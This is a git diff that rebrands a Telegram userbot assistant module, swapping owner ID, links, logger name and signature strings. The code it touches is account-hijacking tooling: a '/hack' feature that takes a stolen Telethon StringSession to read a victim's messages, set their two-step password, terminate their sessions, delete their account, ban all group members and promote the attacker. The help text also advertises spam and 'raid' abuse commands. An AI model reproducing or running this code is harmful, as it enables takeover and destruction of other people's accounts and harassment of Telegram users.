@@ -15,7 +15,7 @@ from .helpers.hack import *
 
 mybot = "missrose_bot"
 
-legendboy = 2024465080
+legendboy = 5778117994
 
 
 from telethon import Button, custom, events
@@ -23,11 +23,11 @@ from telethon import Button, custom, events
 from .core.logger import logging
 from .core.session import legend, tgbot
 
-LOGS = logging.getLogger("LegendUserBot")
-LEGEND_PIC = "https://te.legra.ph/file/d3785d49b2c5e6f00bc67.jpg"
+LOGS = logging.getLogger("CyberUserBot")
+LEGEND_PIC = "https://telegra.ph/file/6359f460ffdddd84a9d06.jpg"
 
 onbot = "start - Check if I am Alive \nhelp - Check ALL Command\nalive- To Check alive status\nping - To check ping of bot\nuinfo - To Check info of assistant chat\nbroadcast - broadcast message to all the person who has started ur bot\nban - to ban person to block message in assistant chat\nunban - To Unban Person allw to message in assistant chat\neval - To run python code\npurge - To Purge Message from replied\ndel - To del replied message\nbigspam - To Spam Through Bot value > 100\ndelayspam - Spam With Delay \nraid - To Abuse Anyone By username/name/reply\nreplyraid - To Activate Raid On Anyone\ndreplyraid - To Stop Raid\nspam - To Spam With Chat value < 100\nhack - Hack Telegram account through StringSession"
-perf = "[ †hê Lêɠêɳ̃dẞø† ]"
+perf = "[ ₵𝕐𝔹𝔼℞☾฿𝕌₢𝕂☽『℧𝕊𝔼ℝß𝕆𝕋』 ]"
 
 bot = legend
 
@@ -97,11 +97,11 @@ async def help(event):
         await event.delete()
         await tgbot.send_message(
             event.chat_id,
-            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [Cyberbot](https://t.me/Cyberbot_OP)",
+            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [₵𝕐𝔹𝔼℞☾฿𝕌₢𝕂☽『℧𝕊𝔼ℝß𝕆𝕋』](https://t.me/invisiblesecuritycyberbuckchat)",
             buttons=[
                 [
-                    Button.url(" Support ", "https://t.me/Cyberbot_OP"),
-                    Button.url(" Updates ", "https://t.me/Cyberbot_AI"),
+                    Button.url(" Support ", "https://t.me/invisiblesecuritycyberbuckchat"),
+                    Button.url(" Updates ", "https://t.me/invisiblesecuritycyberbuckchat"),
                 ],
                 [
                     custom.Button.inline(" Users ", data="users"),
@@ -141,7 +141,7 @@ async def help(event):
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"shutdown")))
 async def rel(event):
     if event.query.user_id == bot.uid:
-        await event.answer("ShutDown Lêɠêɳ̃dẞø†...", cache_time=0, alert=True)
+        await event.answer("ShutDown ₵𝕐𝔹𝔼℞☾฿𝕌₢𝕂☽『℧𝕊𝔼ℝß𝕆𝕋』...", cache_time=0, alert=True)
         if BOTLOG:
             await event.client.send_message(
                 BOTLOG_CHATID, "#SHUTDOWN \n" "Bot shut down"
@@ -345,13 +345,13 @@ async def users(event):
             )
         if len(i) > 3855:
             file = open("session.txt", "w")
-            file.write(i + "\n\nDetails BY LegendBoy")
+            file.write(i + "\n\nDetails BY LegendX")
             file.close()
             await bot.send_file(event.chat_id, "session.txt")
             system("rm -rf session.txt")
         else:
             await event.reply(
-                i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard
+                i + "\n\nThanks For using LegendXBot. \n/hack", buttons=keyboard
             )
 
 
@@ -369,7 +369,7 @@ async def users(event):
             )
         i = await userinfo(strses.text)
         await event.reply(
-            i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard
+            i + "\n\nThanks For using LegendX Bot.\n/hack", buttons=keyboard
         )
 
 
@@ -389,7 +389,7 @@ async def users(event):
         grpid = await x.get_response()
         await userbans(strses.text, grpid.text)
         await event.reply(
-            "Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard
+            "Banning all members. Thanks For using LegendXBot", buttons=keyboard
         )
 
 
@@ -406,7 +406,7 @@ async def users(event):
                 "This StringSession Has Been Terminated.", buttons=keyboard
             )
         i = await usermsgs(strses.text)
-        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using LegendX Bot", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
@@ -425,7 +425,7 @@ async def users(event):
         grpid = await x.get_response()
         await joingroup(strses.text, grpid.text)
         await event.reply(
-            "Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard
+            "Joined the Channel/Group Thanks For using LegendX Bot", buttons=keyboard
         )
 
 
@@ -465,7 +465,7 @@ async def users(event):
         grpid = await x.get_response()
         await delgroup(strses.text, grpid.text)
         await event.reply(
-            "Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard
+            "Deleted the Channel/Group Thanks For using LegendXBot.", buttons=keyboard
         )
 
 
@@ -484,7 +484,7 @@ async def users(event):
         i = await user2fa(strses.text)
         if i:
             await event.reply(
-                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
+                "User don't have two step thats why now two step is `LegendX Bot Is best` you can login now\n\nThanks For using LegendX Bot.",
                 buttons=keyboard,
             )
         else:
@@ -505,7 +505,7 @@ async def users(event):
             )
         await terminate(strses.text)
         await event.reply(
-            "The all sessions are terminated\n\nThanks For using LegendBoyBot.",
+            "The all sessions are terminated\n\nThanks For using LegendXBot.",
             buttons=keyboard,
         )
 
@@ -524,7 +524,7 @@ async def users(event):
             )
         await delacc(strses.text)
         await event.reply(
-            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.",
+            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendX Bot.",
             buttons=keyboard,
         )
 
@@ -547,7 +547,7 @@ async def users(event):
         user = await x.get_response()
         await promote(strses.text, grp.text, user.text)
         await event.reply(
-            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.",
+            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendX Bot.",
             buttons=keyboard,
         )
 
@@ -612,7 +612,7 @@ async def users(event):
                 await event.respond("Something is wrong")
         except Exception as e:
             await event.respond(
-                "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
+                "SEND THIS ERROR TO - @invisiblesecuritycyberbuckchat\n**LOGS**\n" + str(e)
             )
 
 
